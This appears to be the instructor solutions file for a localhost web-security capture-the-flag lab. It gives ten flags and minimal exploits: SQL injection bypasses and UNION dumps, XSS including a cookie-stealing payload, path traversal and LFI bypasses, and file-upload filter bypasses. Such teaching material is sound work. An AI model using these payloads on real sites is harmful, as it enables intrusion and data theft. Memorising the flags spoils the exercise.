# 🔑 SOLUTIONS (instructor copy)

Flags and minimal exploits. Keep private. Full walkthroughs + fixes are in each `challenges/NN_*/README.md`.

| # | Challenge | Port | Pts | Flag |
|---|-----------|------|-----|------|
| 1 | IDOR — Easy | 8001 | 100 | `FLAG{idor_h0rizontal_pr1v_esc}` |
| 2 | Broken Access — Hard | 8002 | 250 | `FLAG{broken_access_vertical_esc}` |
| 3 | SQLi — Login Bypass | 8003 | 100 | `FLAG{sql1_auth_bypass_comment}` |
| 4 | SQLi — UNION | 8004 | 250 | `FLAG{un1on_based_data_dump}` |
| 5 | XSS — Reflected | 8005 | 100 | `FLAG{r3flected_xss_proven}` |
| 6 | XSS — Stored+Bypass | 8006 | 250 | `FLAG{st0red_xss_filter_bypass}` |
| 7 | Path Traversal | 8007 | 100 | `FLAG{path_traversal_dotdot}` |
| 8 | LFI — Bypass | 8008 | 250 | `FLAG{lfi_encoded_traversal_bypass}` |
| 9 | Upload — Unrestricted | 8009 | 100 | `FLAG{unrestricted_upload_served}` |
| 10 | Upload — Bypass | 8010 | 250 | `FLAG{upload_filter_bypass_exec}` |

**Total: 1750 pts**

Run everything: `python3 run_all.py` → scoreboard at http://127.0.0.1:8000.
Self-test: `./solve_all.sh` (⚠️ resets `scoreboard.db`) → exploits all 10, submits, expects **1750 / 1750**.

## 1 — IDOR (Easy)
Log in `101/password101`, then `GET /account?id=102` → flag in the secret field.

## 2 — Broken Access (Hard)
Log in `ahmed/password101`. `GET /robots.txt` → `Disallow: /admin` (unlinked in UI). `/admin` → 403 "role user".
The server reads the plain cookie `role=user`; set `role=admin` (DevTools or `curl -b 'session=…; role=admin'`) →
`/admin` shows the flag.

## 3 — SQLi login bypass (Easy)
Username `admin' --` (or `' OR '1'='1' --`), any password → authenticated as admin → flag. Logging in as a normal
user shows no flag.

## 4 — SQLi UNION (Hard)
The query returns **3 columns** (name, category, price).
`' ORDER BY 3 --` works, `' ORDER BY 4 --` errors → `' UNION SELECT flag, NULL, NULL FROM secrets --` → flag.
Recon: `' UNION SELECT name, sql, NULL FROM sqlite_master --`. Bonus Mutillidae replay:
`' UNION SELECT ccid, ccnumber, expiration FROM credit_cards --`.

## 5 — Reflected XSS (Easy)
`GET /?q=<script>solve()</script>` (or `<img src=x onerror=solve()>`) → `solve()` reveals the flag.
`solve()` posts `location.search` to `/solve`; the server only pays out if `q` is executable markup calling
`solve()`, so typing `solve()` in the console on a clean page does not work.

## 6 — Stored XSS + bypass (Hard)
`script` is blacklisted (case-insensitive; also kills `javascript:`). Post a comment
`<img src=x onerror=fetch('/collect?c='+document.cookie)>` (or `<svg onload=…>`), click **Ask admin to review**
(`POST /admin/visit`), then open `/collector` → `admin_session=FLAG{…}`.
The admin bot is simulated server-side: it fires auto-triggering handlers (`onerror`, `onload`,
`onfocus`+`autofocus`, `ontoggle`+`open`, …) whose code mentions `cookie` and `/collect`. `/reset` clears state.

## 7 — Path traversal (Easy)
`GET /download?file=../../secret/flag.txt` → flag.

## 8 — LFI bypass (Hard)
Filter removes `../` once, on the raw (undecoded) value. Use `....//....//secret/flag.txt` or
`..%2f..%2fsecret%2fflag.txt` → flag. Plain `../../secret/flag.txt` fails (becomes `secret/flag.txt`).

## 9 — Unrestricted upload (Easy)
Upload `pwn.html` containing `<script src="/static/ctf.js"></script><script>solve()</script>`; open
`/uploads/pwn.html` → flag. (SVG with `<script href="/static/ctf.js"/>` also works.)

## 10 — Upload bypass (Hard)
Blacklist on last extension (case-sensitive) + `Content-Type` must be `image/*`; the server serves a file as HTML if
*any* extension is html/htm/svg/xhtml (case-insensitive). Either:
- upload as `pwn.html.png` (browser sends `image/png`) → open `/uploads/pwn.html.png`, or
- `curl -F 'avatar=@pwn.html;filename=pwn.HtMl;type=image/png' http://127.0.0.1:8010/upload` → open `/uploads/pwn.HtMl`
→ flag.

## Lab safety notes
- Every server binds `127.0.0.1` only; standard library only; no outbound requests.
- Path-traversal reads are confined to their challenge folder by a lab guard (not part of the puzzle).
- Uploads are written only to `challenges/09|10_*/uploads/` and are never executed on the host.
- SQLi uses a local `app.db` rebuilt at each start; sqlite3 refuses stacked queries, so no destructive SQL.
- The XSS admin bot is simulated in-process; "exfiltration" goes to the local `/collect` endpoint only.
